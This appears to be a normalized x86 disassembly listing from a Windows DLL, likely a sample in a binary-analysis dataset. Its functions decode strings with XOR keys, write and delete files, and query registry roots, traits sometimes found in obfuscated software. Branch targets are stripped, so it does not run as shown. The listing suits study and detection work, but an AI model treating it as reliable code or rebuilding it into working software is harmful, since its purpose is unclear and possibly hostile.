mov [ ebp - 0x4 ] edi
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x4c ]
mov ebx [ ebp - 0x48 ]
lea ecx [ ebp - 0xa4 ]
push ecx
mov [ ebp - 0xac ] edx
mov [ ebp - 0xa8 ] eax
call esi
mov eax [ ebp - 0xa0 ]
mov edx [ ebp - 0xa4 ]
mov ecx [ ebp - 0x9c ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edx
mov edx [ ebp - 0x98 ]
lea eax [ ebp - 0x94 ]
push eax
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] edx
call esi
mov edx [ ebp - 0x90 ]
mov ecx [ ebp - 0x94 ]
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x68 ] edx
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] ecx
call esi
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0xac ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0xa8 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x5c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x58 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x54 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x50 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x6c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x68 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x64 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x60 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x84 ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x80 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x7c ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x78 ]
mov [ eax + 0xc ] esi
mov eax [ edx + 0x28 ]
push ecx
call eax
mov esi [ VariantClear@IAT ]
lea ecx [ ebp - 0x84 ]
push ecx
mov edi eax
call esi
lea edx [ ebp - 0x94 ]
push edx
call esi
lea eax [ ebp - 0xa4 ]
push eax
call esi
lea ecx [ ebp - 0x4c ]
push ecx
mov [ ebp - 0x4 ] 0xffffffff
call esi
xor ebx ebx
cmp edi ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x74 ]
push ecx
mov edi r--data
mov [ ebp - 0x14 ] ebx
call sub_10029ba0
mov [ ebp - 0x4 ] 0x4
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
call [ CoUninitialize@IAT ]
lea eax [ ebx + 0x3 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x18 ]
push edx
mov [ ebp - 0x18 ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x38 ]
call eax
test eax eax
jns r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
lea edi [ ebp - 0x14 ]
push edi
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
lea edi [ ebp - 0x74 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_1002eb30
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebp - 0x38 ] ebx
jge r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp ecx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx 0x3
mov [ ebp - 0x4c ] cx
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x4 ] 0x5
mov ebx [ ebp - 0x4c ]
mov edx [ ebp - 0x18 ]
mov edi [ edx ]
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x48 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x40 ]
push edx
mov edx [ edi + 0x20 ]
mov [ eax + 0xc ] ecx
call edx
mov edi eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0xffffffff
call esi
xor ebx ebx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x34 ]
jl r-xdata
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x4c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov edi eax
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x3c ]
cmp ecx ebx
je r-xdata
xor eax eax
cmp ecx ebx
jle r-xdata
lea esp [ esp ]
mov eax ebx
xor ebx ebx
cmp eax [ ebp - 0x3c ]
jl r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
lea edx [ ebp - 0x70 ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
test eax eax
js r-xdata
mov [ ebp - 0x28 ] ebx
lea ebx [ eax + 0x1 ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push ebx
push eax
mov eax [ ecx + 0x20 ]
call eax
test eax eax
js r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] 0x0
mov ecx [ eax ]
push edx
mov edi eax
push eax
mov eax [ ecx + 0x28 ]
call eax
test eax eax
js r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
push ecx
push edx
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax ]
push 0x0
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000dc50
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx eax
sub ecx ebx
sar ecx 0x2
mov eax ecx
cdq
sub eax edx
push edi
mov edi eax
sar edi 0x1
mov [ ebp - 0x8 ] ecx
test edi edi
jle r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ edi + edi + 0x2 ]
jmp r-xdata
mov eax [ ebx + edi * 4 - 0x4 ]
dec edi
sub esi 0x2
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] edi
cmp esi ecx
jge r-xdata
jne r-xdata
mov ecx [ ebx + esi * 4 - 0x4 ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x8 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push edi
call sub_1005d1b0
add esp 0xc
test edi edi
jg r-xdata
mov edx [ ebx + ecx * 4 - 0x4 ]
mov eax [ ebp - 0x4 ]
dec ecx
mov [ ebx + eax * 4 ] edx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + esi * 4 ]
mov [ ebp - 0x4 ] esi
lea esi [ esi + esi + 0x2 ]
mov [ ebx + ecx * 4 ] eax
cmp esi [ ebp - 0x8 ]
jl r-xdata
dec esi
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
pop esi
mov ecx [ ebp - 0x8 ]
cmp esi ecx
sub_1000dd20
push ebp
mov ebp esp
push 0xffffffff
push sub_100812c2
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10036cc0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
push edx
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10036cc0
push 0xffffffff
push edx
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ecx ] dl
call sub_100417c0
sub_1000ddf0
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_10058e83
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_10058e83
pop ecx
sub_1000def6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_1002c59e
dec [ ebp + 0x1c ]
jne r-xdata
sub_1000df21
push 0x34
mov eax sub_1007f454
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x40 ] eax
mov al [ ebx ]
test al al
je r-xdata
xor esi esi
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_10006560
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
mov eax [ ebp - 0x3c ]
call sub_1004fa89
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
mov al [ edi + ebx ]
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + esi ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_1003b7cf
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov al [ edi + ebx ]
cmp al [ ecx + 0x5 ]
jne r-xdata
call sub_10004056
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_1003b7cf
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_10066573
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor esi esi
xor edi edi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_1000e0a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10083175
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4b4 ] eax
xor eax eax
mov esi edx
movzx edx ax
xor ebx ebx
mov [ ebp - 0x4b0 ] ebx
mov eax edx
mov [ ebp - 0x4ac ] ecx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x3d4 ]
[ edi ]
push ebx
xor eax eax
push r--data
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4a8 ] esi
mov [ ebp - 0x4a0 ] ebx
mov [ ebp - 0x4b0 ] ebx
mov [ ebp - 0x3dc ] 0x7
mov [ ebp - 0x3e0 ] ebx
mov [ ebp - 0x3f0 ] ax
call sub_100531b0
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push esi
mov [ ebp - 0x4 ] ebx
call [ CreateFileW@IAT ]
mov [ ebp - 0x49c ] eax
cmp eax ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
push ebx
push 0x1
push 0x1
lea esi [ ebp - 0x460 ]
call sub_10001f30
add esp 0xc
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0x1
call sub_10036380
mov edi 0x8
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x44c ] edi
jb r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0xa2
inc cl
mov [ ebp + eax - 0x4a4 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x4a2 ] bl
xor eax eax
nop
mov esi [ ebp - 0x4b4 ]
lea eax [ ebp - 0x3f0 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_10036380
cmp [ ebp - 0x3dc ] edi
jb r-xdata
mov ecx [ ebp - 0x460 ]
push ecx
call sub_1006591f
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x3b
inc cl
mov [ ebp + eax - 0x1cc ] dl
movzx eax cl
cmp eax 0x6f
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x15d ] bl
xor eax eax
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x3f0 ]
push ecx
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x30
inc cl
mov [ ebp + eax - 0x5c ] dl
movzx eax cl
cmp eax 0x19
jb r-xdata
mov edi 0xf
lea eax [ ebp - 0x4a4 ]
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x430 ] edi
mov [ ebp - 0x434 ] ebx
mov [ ebp - 0x444 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x4a4 ]
push eax
lea ecx [ ebp - 0x444 ]
call sub_10043190
lea ecx [ ebp - 0x444 ]
push ecx
lea edx [ ebp - 0x1cc ]
push edx
lea eax [ ebp - 0x460 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10021390
add esp 0xc
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x428 ]
mov [ ebp - 0x4 ] 0x3
call sub_100150a0
add esp 0x4
mov esi 0x10
cmp [ ebp - 0x44c ] esi
jb r-xdata
mov [ ebp - 0x44c ] edi
mov [ ebp - 0x450 ] ebx
mov [ ebp - 0x460 ] bl
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x430 ] esi
jb r-xdata
mov ecx [ ebp - 0x460 ]
push ecx
call sub_1006591f
add esp 0x4
mov esi [ ebp - 0x414 ]
mov [ ebp - 0x430 ] edi
mov edi [ ebp - 0x428 ]
mov [ ebp - 0x434 ] ebx
mov [ ebp - 0x444 ] bl
mov eax edi
cmp esi 0x10
jae r-xdata
mov edx [ ebp - 0x444 ]
push edx
call sub_1006591f
add esp 0x4
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
lea eax [ ebp - 0x428 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov ecx edi
cmp esi 0x10
jae r-xdata
mov esi [ ebp - 0x49c ]
push ebx
lea edx [ ebp - 0x4b8 ]
push edx
push eax
push ecx
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x428 ]
call [ CloseHandle@IAT ]
lea esi [ ebp - 0x4b0 ]
lea ebx [ ebp - 0x4a0 ]
mov edx 0x80000001
call sub_10037640
test eax eax
jne r-xdata
call [ CloseHandle@IAT ]
push ebx
push 0x1
push 0x1
lea esi [ ebp - 0x40c ]
call sub_10001f30
add esp 0xc
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0x7
call sub_10036380
mov edi 0x8
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x3f8 ] edi
jb r-xdata
lea esi [ ebp - 0x4b0 ]
lea ebx [ ebp - 0x4a0 ]
mov edx 0x80000002
call sub_10037640
test eax eax
jne r-xdata
mov esi [ ebp - 0x4a0 ]
mov eax esi
lea edx [ eax + 0x2 ]
mov esi [ ebp - 0x4b4 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x3f0 ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10036380
cmp [ ebp - 0x414 ] 0x10
jb r-xdata
mov eax [ ebp - 0x40c ]
push eax
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0x404 ]
mov eax 0x84
call sub_10013830
mov esi edx
mov [ ebp - 0x4a0 ] 0x0
mov esi [ ebp - 0x4a0 ]
mov eax esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea edx [ eax + eax ]
push edx
push esi
lea eax [ ebp - 0x3d4 ]
push eax
jmp r-xdata
mov [ ebp - 0x414 ] 0xf
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x428 ] bl
cmp [ ebp - 0x3dc ] edi
jb r-xdata
mov eax [ ebp - 0x428 ]
push eax
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0x30 ]
push edx
push esi
call edi
test eax eax
je r-xdata
push 0x0
push 0x1
push 0x1
lea esi [ ebp - 0x40c ]
call sub_10001f30
add esp 0xc
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] bl
call sub_10036380
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x3f8 ] ebx
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea ecx [ eax + eax ]
push ecx
push esi
lea edx [ ebp - 0x3d4 ]
push edx
call sub_100796a0
add esp 0xc
push esi
call [ CharUpperW@IAT ]
mov esi eax
jmp r-xdata
mov ecx [ ebp - 0x3f0 ]
push ecx
jmp r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
push esi
call edi
test eax eax
je r-xdata
lea edi [ ebp - 0x3d4 ]
call sub_1000c010
test eax eax
jne r-xdata
mov eax [ ebp - 0x3e0 ]
push r--data
xor edi edi
lea ecx [ ebp - 0x3f0 ]
call sub_10039b60
test eax eax
jne r-xdata
mov ecx [ ebp - 0x40c ]
push ecx
call sub_1006591f
add esp 0x4
jmp r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x84
call sub_10013830
lea edx [ ebp - 0x30 ]
mov eax 0x87
call sub_10013830
lea edx [ ebp - 0x20 ]
mov eax 0xc
call sub_10013830
lea edx [ ebp - 0x40 ]
mov eax 0xaf
call sub_10013830
mov edi [ StrStrW@IAT ]
lea eax [ ebp - 0x70 ]
push eax
push esi
call edi
mov ebx 0x8
test eax eax
je r-xdata
lea ecx [ ebp - 0x40 ]
push ecx
push esi
call edi
test eax eax
je r-xdata
lea edi [ ebp - 0x3d4 ]
call sub_1000c010
test eax eax
jne r-xdata
lea edx [ ebp - 0x15c ]
mov eax 0x140
call sub_10013830
lea eax [ ebp - 0x3f0 ]
push eax
call sub_1005eea0
jmp r-xdata
mov [ ebp - 0x49c ] eax
lea edx [ ebp - 0x404 ]
mov eax 0x100
call sub_10013830
mov eax edx
push eax
lea ecx [ ebp - 0x47c ]
call sub_10012920
mov edx [ ebp - 0x4a8 ]
push eax
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x4 ] 0x9
call sub_10030dc0
add esp 0x4
mov [ ebp - 0x4 ] 0xa
cmp [ eax + 0x14 ] ebx
jb r-xdata
mov eax [ ebp - 0x4a0 ]
xor edi edi
cmp eax edi
je r-xdata
push eax
push 0x1
push 0x1
lea esi [ ebp - 0x40c ]
call sub_10001f30
add esp 0xc
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0x10
call sub_10036380
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x3f8 ] 0x8
jb r-xdata
push 0x0
push 0x1
push 0x1
lea esi [ ebp - 0x47c ]
call sub_10001f30
add esp 0xc
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0xf
call sub_10036380
mov ecx esi
mov [ ebp - 0x4 ] 0x6
call sub_10029c40
lea edi [ ebp - 0x3d4 ]
call sub_1000c010
test eax eax
jne r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x3d
call sub_10013830
lea eax [ ebp - 0x3f0 ]
push eax
call sub_1005eea0
jmp r-xdata
mov [ ebp - 0x49c ] eax
lea edx [ ebp - 0x404 ]
mov eax 0x158
call sub_10013830
push edx
lea ecx [ ebp - 0x498 ]
call sub_10012920
mov edx [ ebp - 0x4a8 ]
push eax
lea esi [ ebp - 0x47c ]
mov [ ebp - 0x4 ] 0xb
call sub_10030dc0
add esp 0x4
mov [ ebp - 0x4 ] 0xc
cmp [ eax + 0x14 ] ebx
jb r-xdata
mov edx [ ebp - 0x4ac ]
lea ecx [ ebp - 0x49c ]
push ecx
push edx
mov ecx eax
lea edx [ ebp - 0x3d4 ]
call sub_1001a4d0
add esp 0x8
test eax eax
lea ecx [ ebp - 0x498 ]
sete bl
call sub_10029c40
lea ecx [ ebp - 0x47c ]
mov [ ebp - 0x4 ] 0x6
call sub_10029c40
test bl bl
je r-xdata
mov eax [ eax ]
mov edx [ ebp - 0x4a8 ]
push edx
call [ DeleteFileW@IAT ]
mov esi [ ebp - 0x4b4 ]
lea ecx [ ebp - 0x3f0 ]
xor eax eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov ecx esi
mov [ esi ] ax
call sub_10036380
cmp [ ebp - 0x414 ] 0x10
jb r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x40c ]
push ecx
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0x104 ]
mov eax 0x56
call sub_10013830
lea eax [ ebp - 0x3f0 ]
push eax
call sub_1005eea0
jmp r-xdata
mov [ ebp - 0x49c ] eax
lea edx [ ebp - 0x404 ]
mov eax 0x148
call sub_10013830
push edx
lea ecx [ ebp - 0x498 ]
call sub_10012920
mov edx [ ebp - 0x4a8 ]
push eax
lea esi [ ebp - 0x47c ]
mov [ ebp - 0x4 ] 0xd
call sub_10030dc0
add esp 0x4
